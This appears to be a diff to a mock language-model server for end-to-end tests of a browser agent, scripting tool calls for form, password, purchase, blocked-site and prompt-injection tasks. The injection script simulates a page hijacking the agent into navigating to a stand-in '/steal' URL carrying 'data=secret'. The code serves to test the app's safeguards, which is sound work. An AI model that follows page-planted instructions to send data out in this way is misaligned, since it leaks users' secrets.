@@ -14,6 +14,9 @@
  *   site (the model reads images, as its catalog entry says);
  * - the chat title helper is answered with the question's words (chatTitle),
  *   so each chat the check makes has a title of its own;
+ * - a step of the browser agent (a request with tools) is answered with the
+ *   next tool call of the script its task names (AGENT_TASKS), read from the
+ *   page outline the agent sent back - see agentReply;
  * - anything else with a fixed line.
  */
 import http from "node:http";
@@ -81,11 +84,98 @@ function readBody(req) {
 
 const USAGE = { prompt_tokens: 50, completion_tokens: 12, total_tokens: 62 };
 
+/** The agent's scripted tasks: a task starts with one of these. */
+export const AGENT_TASKS = {
+  form: "E2E-AGENT-FORM",
+  password: "E2E-AGENT-PASSWORD",
+  buy: "E2E-AGENT-BUY",
+  injection: "E2E-AGENT-INJECTION",
+  blocked: "E2E-AGENT-BLOCKED",
+  stop: "E2E-AGENT-STOP",
+};
+/** What the form script types into the name field. */
+export const AGENT_NAME = "Majid E2E";
+/** Where the injection script, hijacked by the page, tries to take the agent. */
+export const AGENT_STEAL_PATH = "/steal";
+
+/** The element named `name` with `role` in the latest page outline the agent sent back. */
+function refIn(messages, role, name) {
+  for (let i = messages.length - 1; i >= 0; i -= 1) {
+    const m = messages[i];
+    if (m.role !== "tool" || !String(m.content).includes("URL:")) continue;
+    const line = new RegExp(`\\[(e\\d+)\\] ${role} "${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}"`).exec(String(m.content));
+    if (line) return line[1];
+  }
+  return "e0";
+}
+
+/**
+ * The next step of the script the agent's task names: one tool call, or a
+ * text answer. The step is how many tool calls the conversation already
+ * holds; each script reads the page first and ends with done, saying what
+ * the last answer it got was.
+ */
+function agentReply(messages, { stealUrl }) {
+  const task = text(messages.find((m) => m.role === "user"));
+  const step = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
+  const last = String([...messages].reverse().find((m) => m.role === "tool")?.content ?? "");
+  const answered = (label) => ({ tool: "done", args: { summary: `${label}: ${last.replace(/<[^>]+>/g, "").trim().slice(0, 160)}` } });
+  const script = {
+    [AGENT_TASKS.form]: [
+      () => ({ tool: "read_page", args: {} }),
+      (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Full name"), text: AGENT_NAME } }),
+      (m) => ({ tool: "submit_form", args: { ref: refIn(m, "button", "Send request") } }),
+      () => ({ tool: "read_page", args: {} }),
+      (m) => ({ tool: "done", args: { summary: `Form sent: ${/# (Thanks, [^\n]*)/.exec(String([...m].reverse().find((x) => x.role === "tool")?.content ?? ""))?.[1] ?? "no thanks page"}` } }),
+    ],
+    [AGENT_TASKS.password]: [
+      () => ({ tool: "read_page", args: {} }),
+      (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Password"), text: "hunter2" } }),
+      () => answered("Password step"),
+    ],
+    [AGENT_TASKS.buy]: [
+      () => ({ tool: "read_page", args: {} }),
+      (m) => ({ tool: "click", args: { ref: refIn(m, "button", "Buy now") } }),
+      () => answered("Buy step"),
+    ],
+    [AGENT_TASKS.injection]: [
+      () => ({ tool: "read_page", args: {} }),
+      // As if the page's hidden text had hijacked the model.
+      () => ({ tool: "navigate", args: { url: `${stealUrl}?data=secret` } }),
+      () => answered("Navigation step"),
+    ],
+    [AGENT_TASKS.blocked]: [
+      () => ({ tool: "navigate", args: { url: "http://blocked.example/" } }),
+      () => answered("Blocked step"),
+    ],
+    [AGENT_TASKS.stop]: [
+      () => ({ tool: "read_page", args: {} }),
+      () => ({ tool: "wait_for", args: { seconds: 10 } }),
+      () => answered("Waited"),
+    ],
+  };
+  const name = Object.keys(script).find((key) => task.startsWith(key));
+  const next = name ? script[name][step] : null;
+  return next ? next(messages) : { text: "The script has no more steps." };
+}
+
+function toolCallFrames({ id, created, callId, tool, args }) {
+  const base = { id, object: "chat.completion.chunk", created, model: MOCK_MODEL };
+  const json = JSON.stringify(args);
+  const half = Math.ceil(json.length / 2);
+  return [
+    { ...base, choices: [{ index: 0, delta: { role: "assistant", content: null, tool_calls: [{ index: 0, id: callId, type: "function", function: { name: tool, arguments: "" } }] }, finish_reason: null }] },
+    { ...base, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: json.slice(0, half) } }] }, finish_reason: null }] },
+    { ...base, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: json.slice(half) } }] }, finish_reason: null }] },
+    { ...base, choices: [{ index: 0, delta: {}, finish_reason: "tool_calls" }], usage: USAGE },
+  ];
+}
+
 /**
  * Start the server on 127.0.0.1:port (0 picks a free one). `plantBase` is
  * where the planted images point: somewhere the check watches for requests.
  */
-export async function startMockLlm({ port = 0, plantBase = "https://planted.invalid" } = {}) {
+export async function startMockLlm({ port = 0, plantBase = "https://planted.invalid", stealUrl = "http://localhost:9/steal" } = {}) {
   const requests = [];
   const server = http.createServer(async (req, res) => {
     try {
@@ -99,10 +189,23 @@ export async function startMockLlm({ port = 0, plantBase = "https://planted.inva
       if (req.method === "POST" && req.url?.endsWith("/chat/completions")) {
         const body = JSON.parse((await readBody(req)) || "{}");
         const messages = Array.isArray(body.messages) ? body.messages : [];
-        requests.push({ model: body.model, stream: Boolean(body.stream), messages });
-        const reply = replyFor(messages, plantBase);
+        requests.push({ model: body.model, stream: Boolean(body.stream), messages, tools: body.tools, tool_choice: body.tool_choice });
         const id = `chatcmpl-e2e-${requests.length}`;
         const created = Math.floor(Date.now() / 1000);
+        if (Array.isArray(body.tools) && body.tools.length && body.stream) {
+          const next = agentReply(messages, { stealUrl });
+          res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
+          const frames = next.tool
+            ? toolCallFrames({ id, created, callId: `call_e2e_${requests.length}`, tool: next.tool, args: next.args })
+            : [
+                { id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta: { role: "assistant", content: next.text }, finish_reason: null }] },
+                { id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: USAGE },
+              ];
+          for (const frame of frames) res.write(`data: ${JSON.stringify(frame)}\n\n`);
+          res.end("data: [DONE]\n\n");
+          return;
+        }
+        const reply = replyFor(messages, plantBase);
         if (!body.stream) {
           res.writeHead(200, { "content-type": "application/json" });
           res.end(
